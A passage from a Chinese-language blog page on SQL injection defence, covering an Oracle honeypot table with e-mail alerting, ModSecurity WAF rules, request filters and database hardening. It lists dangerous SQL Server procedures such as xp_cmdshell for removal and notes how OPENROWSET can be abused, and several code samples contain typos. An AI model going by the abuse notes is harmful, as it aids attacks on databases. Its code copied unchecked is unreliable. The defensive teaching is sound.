title=\"创建honeypot(蜜罐)\"></a>创建honeypot(蜜罐)</h4><p>如果希望在有人尝试从数据库读取口令时收到警告，可以创建一种带password列（包含假数据）的附加honeypot（蜜罐）表。如果假数据被选中，那么应用管理员将会收到一封e-mail。</p>\n<p>在 Oracle中，可以使用虚拟专用数据库（Virtual Private Database, VPD）来实现</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">--创建蜜罐表</span>\n<span class=\"token keyword\">create</span> <span class=\"token keyword\">table</span> app_user<span class=\"token punctuation\">.</span>tblusers <span class=\"token punctuation\">(</span><span class=\"token operator\">is</span> number<span class=\"token punctuation\">,</span> name varchar2<span class=\"token punctuation\">(</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> password varchar2 <span class=\"token punctuation\">(</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">--创建向管理员发送e-mail的策略函数</span>\n<span class=\"token comment\">--必须用另外一个模式来创建该函数，比如secuser</span>\n<span class=\"token keyword\">create</span> <span class=\"token operator\">or</span> <span class=\"token keyword\">replace</span> secuser<span class=\"token punctuation\">.</span><span class=\"token keyword\">function</span> get_cust_id\np_schema <span class=\"token operator\">in</span> varchar2<span class=\"token punctuation\">,</span>\np_table <span class=\"token operator\">in</span> varchar2\n<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">return</span> varchar2\n<span class=\"token keyword\">as</span>\nv_connection UTL_SMTP<span class=\"token punctuation\">.</span>CONNECTION<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">begin</span>\nv_connection :<span class=\"token operator\">=</span> UTL_SMTP<span class=\"token punctuation\">.</span>OPEN_CONNECTION<span class=\"token punctuation\">(</span><span class=\"token string\">'mailhost.victim.com'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nUTL_SMTP<span class=\"token punctuation\">.</span>HELO<span class=\"token punctuation\">(</span>v_connection<span class=\"token punctuation\">,</span><span class=\"token string\">'mailhost.victim.com'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nUTL_SMTP<span class=\"token punctuation\">.</span>MAIL<span class=\"token punctuation\">(</span>v_connection<span class=\"token punctuation\">,</span><span class=\"token string\">'app@victim.com'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nUTL_SMTP<span class=\"token punctuation\">.</span>RCPT<span class=\"token punctuation\">(</span>v_connection<span class=\"token punctuation\">,</span><span class=\"token string\">'admin@victim.com'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nUTL_SMTP<span class=\"token punctuation\">.</span><span class=\"token keyword\">DATA</span><span class=\"token punctuation\">(</span>v_connection<span class=\"token punctuation\">,</span><span class=\"token string\">'WARNING! SELECT PERFORMED ON HONEYPOT'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \nUTL_SMTP<span class=\"token punctuation\">.</span>QUIT<span class=\"token punctuation\">(</span>v_connection<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">return</span> <span class=\"token string\">'1=1'</span> <span class=\"token punctuation\">;</span><span class=\"token comment\">--总是显示整个表</span>\n<span class=\"token keyword\">end</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">/</span>\n<span class=\"token comment\">--将策略函数赋值给蜜罐表TBLUSERS</span>\n<span class=\"token keyword\">exec</span> dbms_rls<span class=\"token punctuation\">.</span>add_policy <span class=\"token punctuation\">(</span>\n<span class=\"token string\">'APP_USER'</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">'TBLUSERS'</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">'GET_CUST_ID'</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">'SECUSER'</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">''</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">'SELECT, INSERT, UPDATE, DELETE'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"附加的安全开发资源\"><a href=\"#附加的安全开发资源\" class=\"headerlink\" title=\"附加的安全开发资源\"></a>附加的安全开发资源</h4><ul>\n<li><p>OWASP(Open Web Application Security Project，开放式 Web 应用安全项目<a href=\"http://www.owasp.org/\">owasp</a> </p>\n</li>\n<li><p>CWE/SANS 2009 年度25大最危险编程错误(<a href=\"http://cwe.mitre.org/top25/index.html)%E6%98%AF\">http://cwe.mitre.org/top25/index.html)是</a> MITRE (SANS协会)和许多高级安全专家通力合作的成果</p>\n</li>\n<li><p>SANS软件安全协会(<a href=\"http://www.sans-ssi.org)提供了安全开发方面的培训和证书,以及大量由sans认证检验员提供的参考信息和研究资料./\">www.sans-ssi.org)提供了安全开发方面的培训和证书，以及大量由SANS认证检验员提供的参考信息和研究资料。</a></p>\n</li>\n<li><p>Oracle 的 SQL 注入攻击防御指南(<a href=\"http://st-curriculum.oracle.com/tutorial/SQLInjection/index.htm)%E4%BB%8B%E7%BB%8D%E4%BA%86%E5%BE%88%E5%A4%9A%E6%9C%89%E5%8A%A9%E4%BA%8E%E5%85%8D%E5%8F%97SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%B7%A5%E5%85%B7%E5%92%8C%E6%8A%80%E6%9C%AF%E3%80%82\">http://st-curriculum.oracle.com/tutorial/SQLInjection/index.htm)介绍了很多有助于免受SQL注入攻击的工具和技术。</a></p>\n</li>\n<li><p>SQLSecurity.com(<a href=\"http://www.sqlsecurity.com)是一个致力于/\">www.sqlsecurity.com)是一个致力于</a> Microsoft SQL Server 安全的站点</p>\n</li>\n<li><p>Red-Database-Security(<a href=\"http://www.red-database-security.com是一个专门研究/\">www.red-database-security.com是一个专门研究</a> Oracle 安全的公司。它的网站上包含了很多可供下载的关于Oracle安全的报告和白皮书。</p>\n</li>\n<li><p>Pete Finnegan Limited(<a href=\"http://petefinnigan.com)也提供了大量用于保证/\">http://petefinnigan.com)也提供了大量用于保证</a> Oracle 数据库安全的信息。</p>\n</li>\n</ul>\n<h2 id=\"平台层防御\"><a href=\"#平台层防御\" class=\"headerlink\" title=\"平台层防御\"></a>平台层防御</h2><h3 id=\"使用运行时保护\"><a href=\"#使用运行时保护\" class=\"headerlink\" title=\"使用运行时保护\"></a>使用运行时保护</h3><h4 id=\"Web应用防火墙\"><a href=\"#Web应用防火墙\" class=\"headerlink\" title=\"Web应用防火墙\"></a>Web应用防火墙</h4><p>Web应用防火墙（WAF）是一种网络设备或是一种将安全特性添加到Web应用的基于软件的解决方案。</p>\n<p>基于软件的WAF通常是一些以最小化配置嵌入到Web服务器或应用程序中的模块，它们的主要好处是Web基础结构仍保持不变，并且能够无缝地处理HTTP/HTTPS通信，因为它们运行在承载Web或应用程序的进程中。</p>\n<p>WAF 的事实标准是开源的 <a href=\"http://www.modsecurity.org/\">ModSecurity</a>.ModSecurity被开发成 Apache的一个模块。如果将Apache Web服务器配置成反向代理，那么ModSecurity实际上可以保护任何Web应用，可以使用ModSecurity来实现攻击预防、监控、入侵检测和一般的应用程序加固。</p>\n<p>我们将使用ModSecurity作为主要的例子来介绍使用WAF时在检测并预防SQL注入方面的主要特征。</p>\n<h5 id=\"可配置规则集\"><a href=\"#可配置规则集\" class=\"headerlink\" title=\"可配置规则集\"></a>可配置规则集</h5><p>WAF必须高度可配置才能适应各种不同的情况。</p>\n<p>ModSecurity的威力在于它的规则语言上，这种语言是配置指令和应用到HTTP请求和响应的一种简单编程语言的组合。ModSecurity的SecRule 指令的通用语法，如下所示：</p>\n<pre class=\"line-numbers language-SecRules\" data-language=\"SecRules\"><code class=\"language-SecRules\">SecRule VARIABLE OPERATOR [ACTIONS]<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>VARIABLE属性告诉ModSecurity到哪里访问请求或响应，OPERATOR属性告诉ModSecurity如何检查数据，ACTIONS属性确定出现匹配时做哪些操作。ACTIONS属性是可选的规则选项， 它可以定义默认的全局动作。</p>\n<p>ModSecurity核心规则集(ModSecurity Core Rule Set)的 Generic Attacks 规则文件(modsecurity_crs_40_generic_attacks.conf)中的一条实际的黑名单SQL注入规则</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\">&lt;Location /apps/script.php&gt;\nSecRule &amp;ARGS \"!@eq 1\"\nSecRule ARGS_NAMES \"!Astatid$\"\nSecRule ARGS:statID \"!^\\d{1,3}$\"\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>Location</span><span class=\"token punctuation\">&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"请求覆盖范围\"><a href=\"#请求覆盖范围\" class=\"headerlink\" title=\"请求覆盖范围\"></a>请求覆盖范围</h5><p>攻击有效载荷可以出现在HTTP请求的任何位置，比如查询字符串、POST数据、cookie、自定义的或是标准的HTTP头(例如,Referer, Server等)，以及URL路径的部分内容中。ModSecurity能够处理所有这些情况。下面列出了 ModSecurity支持的变量列表</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">REQUEST BASENAME\nREQUEST BODY\nREQUEST BODY LENGTH\nREQUEST COOKIES\nREQUEST COOKIES NAMES\nREQUEST FILENAME\nREQUEST HEADERS\nREQUEST HEADERS NAMES\nREQUEST LINE\nREQUEST METHOD\nREQUEST PROTOCOL\nREQUEST URI\nREQUEST URI RAW<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"请求标准化\"><a href=\"#请求标准化\" class=\"headerlink\" title=\"请求标准化\"></a>请求标准化</h5><p>ModSecurity能够应对任何复杂的编码场景。它支持大量转换函数，可以将这些函数按任意顺序多次应用到每条规则上。下面列出了 ModSecurity参考手册中的转换函数</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">base64Decode\nbase64DecodeExt\nbase64Encode\ncmdLine\ncompressWhitespace\ncssDecode\nescapeSeqDecode\nhexDecode\nhexEncode\nhtmlEntityDecode\njsDecode\nlength\nlowercase\nmd5\nnone\nnormalisePath\nnormalisePathwin\nparityEven7bit\nparityodd7bit\nparityzero7bit\nremoveNulls\nremoveWhitespace\nreplaceComments\nremoveCommentsChar\nremoveComments\nreplaceNulls\nurlDecode\nurlDecodeUni\nurlEncode\nsha1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>如果内置函数因为某个原因无法满足需求，可以使用ModSecurity支持的Lua脚本语言来构建自定义的转换函数。</p>\n<h5 id=\"响应分析\"><a href=\"#响应分析\" class=\"headerlink\" title=\"响应分析\"></a>响应分析</h5><p>抑制关键信息泄露，比如详细的SQL错误消息。</p>\n<p>ModSecurity核心规则集的Outbound规则文件(modsecurity_ crs_50_ outbound.conf)中的一条实际的带外(outbound)规则</p>\n<p>如果响应中的消息成功匹配了正则表达式(表明产生了SQL错误)，ModSecurity可以做出适当的响应，比如禁止将错误返回给攻击者，或者提供替换的错误编码或错误消息以迷惑自动客户端和扫描器。</p>\n<h5 id=\"入侵检测能力\"><a href=\"#入侵检测能力\" class=\"headerlink\" title=\"入侵检测能力\"></a>入侵检测能力</h5><p>WAF应该可以被动监视应用的行为，遇到可疑的行为时能采用行动，并能在SQL注入事件之后为取证分析(forensic analysis)保持一个不可否认的事件日志。</p>\n<p>使用ModSecurity可以阻止SQL注入攻击、修复已知的SQL注入漏洞、检测攻击企图并抑制那些通常会为SQL注入漏洞利用提供便利的SQL错误消息。</p>\n<h4 id=\"截断过滤器\"><a href=\"#截断过滤器\" class=\"headerlink\" title=\"截断过滤器\"></a>截断过滤器</h4><p>过滤器是WAF的独立模块，可添加新过滤器</p>\n<p>过滤器适合执行跨请求和响应（与核心应用逻辑是松耦合）的集中的、可重复的任务。过滤器还适用于输入验证、将请求/响应记录到日志以及转换输出响应等安全功能。</p>\n<h5 id=\"Web服务器过滤器\"><a href=\"#Web服务器过滤器\" class=\"headerlink\" title=\"Web服务器过滤器\"></a>Web服务器过滤器</h5><p>可以将过滤器实现成Web服务器模块/插件，它们能对核心请求和响应进行扩展以便处理 Web服务器平台的API。Apache、 Netscape（Oracle/Sun）、IIS（Intemet信息服务）等流行的Web服务器平台均支持这种架构。</p>\n<p>ModSecurity是一种能够提供相当多的SQL注入保护的Apache API模块。UrlScan和WebKnight，它们是集成到IIS Web服务器平台的ISAPI过滤器，能够提供SQL注入保护。</p>\n<h5 id=\"应用程序过滤器\"><a href=\"#应用程序过滤器\" class=\"headerlink\" title=\"应用程序过滤器\"></a>应用程序过滤器</h5><p>也可以使用Web应用的编程语言或框架来实现过滤器。其架构与Web服务器插件的架构类似：模块代码在请求和响应经历一系列阶段的过程时执行。可以使用ASP.NET的 System.Web.IHttpModule和javax.servlet.Filter接口来实现过滤器模式，之后可以在不修改代码的前提下将它们添加到应用中并在应用程序的配置文件中显式地激活它们。</p>\n<p>下面列出了自定义的J2EE Filter类的doFilter方法的示例代码。每个请求/响应对会因为J2EE Web源（JSP文件、servlet等）的请求而调用该方法：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">SqlInjDetectionFilter</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">Filter</span> <span class=\"token punctuation\">{</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doFilter</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletRequest</span> req<span class=\"token punctuation\">,</span> <span class=\"token class-name\">ServletResponse</span> res<span class=\"token punctuation\">,</span>\nchain filterchain<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ServletException</span> <span class=\"token punctuation\">{</span>\n<span class=\"token comment\">//检查请求数据，寻找恶意字符</span>\n<span class=\"token function\">doDetectSqlI</span><span class=\"token punctuation\">(</span>rep<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//调用链中的下一个过滤器</span>\nchain<span class=\"token punctuation\">.</span><span class=\"token function\">doFilter</span><span class=\"token punctuation\">(</span>servletRequest<span class=\"token punctuation\">,</span> servletResponse<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>应用程序过滤器确实适合于运行时（runtime）保护，开发时它们可以独立于应用程序，部署时则可以作为独立的.dll或.jar文件并且能立即激活。</p>\n<h5 id=\"使用脚本语言实现过滤器模式\"><a href=\"#使用脚本语言实现过滤器模式\" class=\"headerlink\" title=\"使用脚本语言实现过滤器模式\"></a>使用脚本语言实现过滤器模式</h5><p>就PHP Web应用而言，可以在php.ini文件中利用auto_prepend_file和auto_append_file配置指令，这些指令指向那些在每个请求的PHP脚本执行之前和之后才执行的PHP文件。添加的逻辑在各种HTTP请求集合（查询字符串、POST、cookie、头等）间循环，必要时可以进行验证和或日志记录。</p>\n<p>另一种用于PHP和经典ASP应用的方法是使用包含文件（include file）。这需要通过在每个应用程序页面添加include指令来修改代码。同样，被包含的逻辑也在各种HTTP请求集合间循环，必要时也可以进行验证和或日志记录。</p>\n<h5 id=\"过滤Web服务消息\"><a href=\"#过滤Web服务消息\" class=\"headerlink\" title=\"过滤Web服务消息\"></a>过滤Web服务消息</h5><p>使用自定义的输入和输出过滤器同样可以很容易地将截断过滤器模式应用于XML Web服务。</p>\n<h4 id=\"不可编辑与可编辑的输入保护\"><a href=\"#不可编辑与可编辑的输入保护\" class=\"headerlink\" title=\"不可编辑与可编辑的输入保护\"></a>不可编辑与可编辑的输入保护</h4><p>输入验证策略，将应用程序的输入分成可编辑的和不可编辑的两类，并且锁定不可编辑的输入以便无法操作它们。不可编辑输入是指最终用户不需要直接修改的输入，比如隐藏表单字段、URI和查询字符串参数、cookie等。该策略隐含的原理是：应用程序应该只允许用户执行用户接口暴露给他们的动作。</p>\n<p>实现这种策略的技术范例是HDIV(HTTP Data Integrity Validator, HTTP数据完整性验证器) 和SPF。</p>\n<h4 id=\"URL策略与页面层策略\"><a href=\"#URL策略与页面层策略\" class=\"headerlink\" title=\"URL策略与页面层策略\"></a>URL策略与页面层策略</h4><p>不修改源代码的前提下，为易受攻击的URL或页面打虚拟补丁的技术。</p>\n<h5 id=\"页面覆写-override\"><a href=\"#页面覆写-override\" class=\"headerlink\" title=\"页面覆写(override)\"></a>页面覆写(override)</h5><p>如果页面易受攻击且需要替换，那么可以创建一个在运行时提交的替代页面或类，通过修改Web应用配置文件中的配置可以实现这种替换。在ASP.NET应用中，则可以使用HTTP handler (处理程序)实现这一任务。</p>\n<p>下面展示了一自定义HTTP handler的配置，它用于处理发送给PageVulnToSqll.aspx页面而非易受攻击页面的请求。</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>httpHandlers</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>add</span> <span class=\"token attr-name\">verb</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>*<span class=\"token punctuation\">\"</span></span>\n<span class=\"token attr-name\">path</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>PageVulnToSqlI.aspx<span class=\"token punctuation\">\"</span></span>\n<span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Chapter9.Examples.SecureAspxHandler, Subclass<span class=\"token punctuation\">\"</span></span>\n<span class=\"token attr-name\">validate</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>false<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>httpHandlers</span><span class=\"token punctuation\">&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>将易受攻击的URL映射到一个通过安全方式处理请求的servlet上</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-name</span><span class=\"token punctuation\">&gt;</span></span>SecureServlet<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-name</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-class</span><span class=\"token punctuation\">&gt;</span></span>chapter9.examples.SecureServletClass<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servletclass</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-mapping</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token comment\">&lt;!--&lt;servlet-name&gt;ServletVulnToSqli&lt;/servlet-name&gt;--&gt;</span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-name</span><span class=\"token punctuation\">&gt;</span></span>SecureServlet<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-name</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>url-pattern</span><span class=\"token punctuation\">&gt;</span></span>/ServletVulnToSqli<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>url-pattern</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-mapping</span><span class=\"token punctuation\">&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"URL重写\"><a href=\"#URL重写\" class=\"headerlink\" title=\"URL重写\"></a>URL重写</h5><p>URL重写(rewrite)是一种与页面覆写(override)类似的技术。可以通过配置Web服务器或应用框架来接收那些发送给易受攻击页面或URL的请求，并将它们重定向到该页面的替代版本。 页面的新版本通过一种安全的方式来实现原始页面逻辑。</p>\n<h5 id=\"资源代理与封装\"><a href=\"#资源代理与封装\" class=\"headerlink\" title=\"资源代理与封装\"></a>资源代理与封装</h5><p>可以将资源代理与封装和页面覆写或URL重写结合使用，以便将替换页面需要的自定义编码数量降至最低。替代页面在处理重写请求时会循环访问请求参数(查询字符串、POST、 cookie等)并执行必需的验证。</p>\n<h4 id=\"面向方面编程\"><a href=\"#面向方面编程\" class=\"headerlink\" title=\"面向方面编程\"></a>面向方面编程</h4><p>面向方面编程(Aspect-Oriented Programming, AOP)是一种构建可应用到应用程序范围内的通用可重用例程的技术。在开发过程中，它有利于核心应用程序逻辑和通用、重复任务(输入 验证、记录日志、错误处理等)的分离。运行时，可以使用AOP来热补(hot-patch)易受SQL注入攻击的应用程序，也可以无须修改底层源代码就直接将入侵检测和日志审查功能嵌入到应用程序中。</p>\n<h4 id=\"应用程序入侵检测系统\"><a href=\"#应用程序入侵检测系统\" class=\"headerlink\" title=\"应用程序入侵检测系统\"></a>应用程序入侵检测系统</h4><p>可以使用传统的基于网络的入侵检测系统(Intrusion Detection Systems, IDS)来检测SQL注入攻击。</p>\n<p>WAF作为一种非常好的IDS，因为它运行在应用层并且可针对受保护 的应用程序进行微调。</p>\n<p>另一种选择是使用PHPIDS<a href=\"http://phpids.org,phpids不会过滤或审查输入,它检测攻击并根据配置来采取措施./\">http://phpids.org，PHPIDS不会过滤或审查输入，它检测攻击并根据配置来采取措施。</a></p>\n<h4 id=\"数据库防火墙\"><a href=\"#数据库防火墙\" class=\"headerlink\" title=\"数据库防火墙\"></a>数据库防火墙</h4><p>防火墙，它本质上是一种介于应用程序和数据库之间的代理服务器。应用程序连接到数据库防火墙并像正常连接到数据库那样发送查询。 数据库防火墙分析预期的查询，如果认为是安全的，就将它传递给数据库服务器加以执行。反之，如果认为是恶意的，就阻止运行该查询。数据库防火墙还可以通过以被动模式监视连接和向管理员发出可疑行为警告来作为恶意数据库行为的应用层IDS。</p>\n<h3 id=\"确保数据库安全\"><a href=\"#确保数据库安全\" class=\"headerlink\" title=\"确保数据库安全\"></a>确保数据库安全</h3><h4 id=\"锁定应用程序数据\"><a href=\"#锁定应用程序数据\" class=\"headerlink\" title=\"锁定应用程序数据\"></a>锁定应用程序数据</h4><h5 id=\"使用较低权限的数据库登录\"><a href=\"#使用较低权限的数据库登录\" class=\"headerlink\" title=\"使用较低权限的数据库登录\"></a>使用较低权限的数据库登录</h5><p>应用程序连接到数据库服务器的登录语境应该是：拥有的许可权限仅仅只能执行需要的应用程序任务。</p>\n<h5 id=\"隔离数据库登录\"><a href=\"#隔离数据库登录\" class=\"headerlink\" title=\"隔离数据库登录\"></a>隔离数据库登录</h5><p>对于既需要写访问也需要读访问数据库的应用程序，可以使用多个用户登录数据库，这是对使用最小权限登录数据库的扩展。</p>\n<h5 id=\"撤销public许可\"><a href=\"#撤销public许可\" class=\"headerlink\" title=\"撤销public许可\"></a>撤销public许可</h5><p>每种数据库服务器平台均拥有通常称为公共（public）角色的默认角色（所有登录均属于这种角色）。它包含一个默认的许可集，其中包括对系统对象的访问。公共角色还被赋予了执行内置系统存储过程、包和用于管理目的的功能的许可。</p>\n<p>应尽可能多地撤销系统对象的公共角色许可。此外，还必须撤销为自定义数据库对象（比如应用程序使用的表和存储过程）赋予的公共角色的冗余许可，必要时可以为自定义角色分配数据库许可。可以使用这些角色来为特定的用户和组赋予默认的访问级别。</p>\n<h5 id=\"使用存储过程\"><a href=\"#使用存储过程\" class=\"headerlink\" title=\"使用存储过程\"></a>使用存储过程</h5><p>从安全角度看，应该将应用程序的SQL查询封装到存储过程中并且只能为这些对象赋予EXECUTE许可。可以撤销底层对象的所有其他许可，比如SELECT，INSERT等。就SQL注入而言，最低权限的数据库登录（应用程序使用的存储过程只拥有EXECUTE许可）可保证更难 向浏览器返回任意结果集。</p>\n<h5 id=\"使用强加密技术来保护存储的敏感数据\"><a href=\"#使用强加密技术来保护存储的敏感数据\" class=\"headerlink\" title=\"使用强加密技术来保护存储的敏感数据\"></a>使用强加密技术来保护存储的敏感数据</h5><p>要想避免数据库中敏感数据的非授权查看，一种关键的控制就是使用强加密技术。可选的方法包括存储数据的数学哈希（而非数据本身）或者存储使用对称算法加密后的数据。</p>\n<p>如果不需要存储数据本身，那么请考虑一种正确的衍生数学哈希。</p>\n<p>如果必须存储敏感数据，请使用强对称加密算法来进行保护，比如AES（Advanced Encryption Standard,高级加密标准）或三重DES（Data Encryption Standard,数据加密标准）。加密敏感数据的主要挑战是将密钥保存到攻击者无法轻易访问到的位置。</p>\n<h5 id=\"维护审查跟踪\"><a href=\"#维护审查跟踪\" class=\"headerlink\" title=\"维护审查跟踪\"></a>维护审查跟踪</h5><p>维护对应用程序数据库对象的访问审查跟踪非常关键。</p>\n<h5 id=\"Oracle错误触发器\"><a href=\"#Oracle错误触发器\" class=\"headerlink\" title=\"Oracle错误触发器\"></a>Oracle错误触发器</h5><p>Oracle提供了一种名为数据库触发器的特性。当出现特定的事件时，比如使用DDL（数据定义语言，比如DDL触发器）创建对象时，或者出现数据库错误（比如ERROR触发器）时，这些触发器会在数据库范围内激活，从而提供了一种简易的方法来检测SQL注入尝试。</p>\n<h4 id=\"锁定数据库服务器\"><a href=\"#锁定数据库服务器\" class=\"headerlink\" title=\"锁定数据库服务器\"></a>锁定数据库服务器</h4><h5 id=\"额外的系统对象锁定\"><a href=\"#额外的系统对象锁定\" class=\"headerlink\" title=\"额外的系统对象锁定\"></a>额外的系统对象锁定</h5><p>除了撤销系统对象(system object)上的公共对象许可外，请考虑采取额外的步骤来进一步锁定特权对象的访问，比如用于系统管理的对象、执行操作系统命令和产生网络连接的对象。</p>\n<p>请考虑通过以下措施来施加约束：确保未向应用程序角色赋予多余冗余许可、通过服务器配置禁用访问系统范围内的特权对象，或者彻底将这些功能从服务器删除(避免重新启用带来的权限提升)。</p>\n<p>在Oracle中，应该约束运行操作系统的命令以及从数据库访问操作系统级文件的能力。</p>\n<p>在SQL Server中，应该考虑删除危险的存储过程，比如xp_cmdshell以及与xp_reg*、xp_ instancereg*和sp_OA*匹配的存储过程。</p>\n<h5 id=\"约束即席查询（ad-hoc-querying）\"><a href=\"#约束即席查询（ad-hoc-querying）\" class=\"headerlink\" title=\"约束即席查询（ad hoc querying）\"></a>约束即席查询（ad hoc querying）</h5><p>Microsoft SQL Server支持一种名为OPENROWSET的命令来查询远程和本地数据源。远程查询的有用之处在于可利用它来攻击所连网络上的其他数据库服务器。使用这一功能查询本地服务器，攻击者可以在更高特权的SQL Server数据库登录语境中重新向服务器发出验证。</p>\n<p>Oracle支持借助数据库链接（database link）的远程服务器的即席查询。</p>\n<h5 id=\"增强对验证周边的控制\"><a href=\"#增强对验证周边的控制\" class=\"headerlink\" title=\"增强对验证周边的控制\"></a>增强对验证周边的控制</h5><p>应该复查所有数据库登录，禁用或删除不必要的内容，比如默认账户。</p>\n<h5 id=\"在最低权限的操作系统账户语境中运行\"><a href=\"#在最低权限的操作系统账户语境中运行\" class=\"headerlink\" title=\"在最低权限的操作系统账户语境中运行\"></a>在最低权限的操作系统账户语境中运行</h5><p>如果攻击者能够突破数据库服务器语境并获取底层操作系统的访问权，那么此时是否处于最低权限的操作系统账户语境中将非常关键。</p>\n<h5 id=\"确保数据库服务器软件打了补丁\"><a href=\"#确保数据库服务器软件打了补丁\" class=\"headerlink\" title=\"确保数据库服务器软件打了补丁\"></a>确保数据库服务器软件打了补丁</h5><p>使用当前的补丁保证软件更新至最新是一项基本的安全规则</p>\n<p>判定SQL Server/Oracle数据库服务器版本</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">数据库</th>\n<th align=\"center\">命令</th>\n<th align=\"center\">版本查阅</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">SQL Server</td>\n<td align=\"center\">select @@version</td>\n<td align=\"center\"><a 